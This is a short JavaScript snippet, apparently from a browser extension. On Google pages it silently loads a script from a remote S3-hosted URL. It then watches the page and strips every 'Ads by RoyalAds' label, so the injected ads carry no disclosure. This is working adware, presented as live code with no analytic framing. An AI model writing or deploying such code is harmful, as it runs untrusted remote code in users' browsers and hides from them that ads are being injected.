if (window.location.hostname.indexOf('google.') !== -1) {
    (function () {
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = '//adjet.s3.amazonaws.com/963844087/pro001.js';
        head.appendChild(script);
        script.onload = function () {
            const replaceOnDocument = (pattern, string, {target = document.body} = {}) => {
                [target, ...target.querySelectorAll("*:not(script):not(noscript):not(style)")].forEach(({childNodes: [...nodes]}) => nodes.filter(({nodeType}) => nodeType === document.TEXT_NODE).forEach((textNode) => textNode.textContent = textNode.textContent.replace(pattern, string)));
            };
            const observer = new MutationObserver(function (mutations) {
                mutations.forEach(function (mutation) {
                    replaceOnDocument(/Ads by RoyalAds/g, "", {target: mutation.target});
                });
            });
            const observerConfig = {attributes: false, childList: true, characterData: true};
            const targetNode = document.body;
            observer.observe(targetNode, observerConfig);
        };
    })();
}
